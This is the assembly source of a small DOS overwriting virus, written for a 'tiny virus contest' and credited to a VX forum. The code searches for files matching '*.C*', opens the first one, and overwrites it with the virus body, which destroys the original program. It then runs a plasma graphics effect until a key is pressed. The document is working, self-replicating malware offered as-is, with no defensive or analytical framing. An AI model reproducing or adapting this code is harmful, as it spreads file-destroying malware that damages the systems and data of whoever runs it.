   ;**********************************************************************
   ;**********************************************************************
   ;
   ; Author: VxF
   ; Creation Date: Dec. 2003 (wasting 10 mins of my life)
   ; Virus Description: This virus is for Slam's Tiny Virus Contest.
   ;                    It's a simple over writer as you will see.
   ;                    The payload is a neat little plasma effect.
   ;                    Roughly:
   ;                             30 bytes (infection method)
   ;                           + 39 bytes (plasma payload)
   ;                           +  4 bytes (File extension for infection)
   ;                           -----------
   ;                             73 bytes total
   ;
   ;**********************************************************************
   ;*                Blackgate Forums - www.blackgate.us                 *
   ;**********************************************************************

   slam        segment byte public
           assume  cs:slam,ds:slam
           org 100h

   Size_   =   25              ; the box's width & height

   start:

           mov ah,4eh          ; find first matching file
           mov dx,offset p         ; with *.C* extension
           int 21h             ; do it now!

           mov ax,3d02h            ; open file for read/write
           mov dx,9eh          ; with ascii filename
           int 21h             ; do it now!

           xchg ax,bx          ; move file handle to ax
           mov ah,40h          ; writing to file
           add dx,62h          ; the data from virus
           int 21h             ; do it now!

   gfx:
           mov al,13h          ; calling VGA mode
           int 10h             ; do it!

           push 0a000h
           pop ds

   rand:
           in al,40h           ; reading from the timer
           sbb di,ax           ; timer output is in ax
           mov cl,Size_

   Vert:
           push cx             ; save Y coordinate
           mov cl,Size_
   Horiz:
           inc byte ptr ds:[di]        ; next color
           inc di              ; next position
           loop Horiz
           add di,320-Size_        ; next row
           pop cx
           loop Vert           ; whole height

           in al,60h           ; check keyboard
           cmp al,3            ; for the '2' key
           jne rand            ; if not then repeat
           int 10h             ; else go back to textmode

           ret             ; and return to DOS

   p   db  '*.C*',0

   slam        ends
           end start
